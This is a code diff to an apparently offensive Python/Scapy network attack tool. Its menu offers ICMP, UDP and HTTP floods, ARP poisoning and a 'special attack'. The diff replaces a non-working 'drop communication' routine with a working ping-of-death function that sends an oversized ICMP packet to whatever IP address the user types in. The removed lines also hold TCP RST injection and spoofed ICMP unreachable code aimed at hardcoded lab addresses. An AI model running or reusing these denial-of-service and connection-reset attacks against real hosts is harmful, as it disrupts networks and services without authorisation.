@@ -20,7 +20,7 @@ def attack_to_perform(number):
         12: perform_icmp_flood_attack,  # icmp flood attack (?)
         13: perform_udp_flood_attack,  # udp flood attack (?)
         14: perform_http_flood_attack,  # http flood attack (?)
-        15: perform_drop_communication,  # drop communication (not working)
+        15: perform_ping_of_death,  # ping of death (ok)
         16: perform_arp_poisoning,  # arp poisoning (to implement)
         17: perform_special_attack,  # special attack
     }
@@ -48,7 +48,7 @@ def print_attack_menu():
     print("(12) ICMP Flood Attack")
     print("(13) UDP Flood Attack")
     print("(14) HTTP Flood Attack")
-    print("(15) Drop Communication")
+    print("(15) Ping of Death")
     print("(16) ARP Poisoning")
     print("(17) Special Attack")
     print("-----------------------------------------------------")
@@ -422,58 +422,17 @@ def perform_http_flood_attack(ip_addr=None, port=80):
     return "HTTP flood attack performed on " + ip_addr + " to port " + str(port)
 
 
-# (15) Code to perform drop communication
-def perform_drop_communication(ip_addr=None):
+# (15) Code to perform ping of death attack
+def perform_ping_of_death(ip_addr=None):
     if not ip_addr:
         # Get input from the user
         ip_addr = input("Enter the IP address to attack: ")
 
-    """
-    # Create a packet filter to capture packets from the specified IP address
-    filter_str = "ip src {}".format(ip_addr)
+    packet = IP(dst=ip_addr) / ICMP() / ("X" * 65508)
 
-    # Sniff packets and execute RST attack
-    def packet_handler(packet):
-        if packet.haslayer(ICMP):
-            if packet[IP].src == ip_addr:
-                # Create an ICMP Destination Unreachable packet to drop the communication
-                drop_packet = ICMP(type=3, code=1)
+    send(packet)
 
-                # Send the ICMP Destination Unreachable packet
-                send(
-                    IP(src=packet[IP].src, dst=packet[IP].dst) / drop_packet, verbose=0
-                )
-                send(
-                    IP(src=packet[IP].dst, dst=packet[IP].src) / drop_packet, verbose=0
-                )
-
-                # Print the dropped communication
-                print(
-                    "Dropped communication: Source IP: {}, Destination IP: {}, ICMP Type: {}, ICMP Code: {}".format(
-                        packet[IP].src,
-                        packet[IP].dst,
-                        packet[ICMP].type,
-                        packet[ICMP].code,
-                    )
-                )
-
-    # Start sniffing packets and call the packet_handler for each captured packet
-    print("Start sniffing...")
-    sniff(filter=filter_str, prn=packet_handler)
-    """
-    """
-    print("telnet reset\n")
-    def do_rst(pkt):
-        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
-        tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, 
-        flags=0x14, seq=pkt[TCP].ack, ack=pkt[TCP].seq+1) # 0x14 = 20 --> RST/ACK
-        pkt = ip/tcp
-        # ls(pkt)
-        send(pkt,verbose=0)
-    sniff(iface="eth1", filter='host ' + "192.168.200.35" + ' and host ' + "192.168.200.40" + ' and port ' + str(args.dstPORT), prn=do_rst)
-    """
-
-    return "Drop communication performed on IP address: {}".format(ip_addr)
+    return "Ping of death attack performed on " + ip_addr
 
 
 # (16) Code to perform ARP poisoning
